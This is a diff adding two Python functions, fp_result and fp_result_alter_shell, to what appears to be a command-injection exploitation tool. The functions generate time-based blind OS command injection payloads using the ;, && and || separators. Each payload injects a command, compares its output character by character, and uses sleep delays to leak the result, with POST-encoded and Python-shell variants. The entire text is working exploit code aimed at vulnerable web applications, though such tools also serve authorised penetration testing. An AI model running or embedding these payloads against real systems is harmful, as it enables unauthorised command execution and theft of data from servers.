@@ -185,6 +185,85 @@ def cmd_execution_alter_shell(separator, cmd, output_length, delay, http_request
   
   return payload
 
+
+#---------------------------------------------------
+# Get the execution output, of shell execution.
+#---------------------------------------------------
+def fp_result(separator, cmd, num_of_chars, ascii_char, delay, http_request_method):
+  if separator == ";" :
+    payload = (separator + " "
+               "str=$(" + cmd + ")" + separator +
+               "if [ " + str(ascii_char) + " != ${str} ]" + separator +
+               "then sleep 0" + separator +
+               "else sleep " + str(delay) + separator +
+               "fi "
+               )
+
+  if separator == "&&" :
+    if http_request_method == "POST":
+      separator = urllib.quote(separator)
+      ampersand = urllib.quote("&")
+    else:
+      ampersand = "&"
+    payload = (ampersand + " " +
+               "sleep 0  " + separator + " "
+               "str=$(" + cmd + ") " + separator + " "
+               "[ " + str(ascii_char) + " -eq ${str} ] " + separator + " "
+               "sleep " + str(delay) + " "
+               )
+    if http_request_method == "POST":
+      separator = urllib.unquote(separator)
+
+  if separator == "||" :
+    payload = (separator + " "
+               "[ " + str(ascii_char) + " -ne  $(" + cmd + ") ] " + separator + 
+               "sleep " + str(delay) + " "
+               )  
+    
+  return payload
+
+"""
+__Warning__: The alternative shells are still experimental.
+"""
+def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_request_method):
+  
+  if separator == ";" :
+    payload = (separator + " "
+               "str=$(python -c \"print $(echo $("+cmd+"))\n\")" + separator +
+               "if [ " + str(ascii_char) + " != ${str} ]" + separator +
+               "then $(python -c \"import time\ntime.sleep(0)\")"+ separator + " "
+               "else $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"+ separator + " "
+               "fi "
+               )
+    
+  elif separator == "&&" :
+    if http_request_method == "POST":
+      separator = urllib.quote(separator)
+      ampersand = "%26"
+    else:
+      ampersand = "&"
+    payload = (ampersand + " " +
+               "$(python -c \"import time\ntime.sleep(0)\") " +  separator + " "
+               "str=$(python -c \"print $(echo $("+cmd+"))\n\")" + separator + " "
+               "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + " "
+               "$(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
+               )
+    if http_request_method == "POST":
+      separator = urllib.unquote(separator)
+
+  elif separator == "||" :
+    payload = (separator + " "
+               "[ " + str(ascii_char) + " -ne $(python -c \"print $(echo $("+cmd+"))\n\") ] " + separator + 
+               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
+               )
+    
+  else:
+    pass
+
+  return payload
+
+
+
 #---------------------------------------------------
 # Get the execution output, of shell execution.
 #---------------------------------------------------
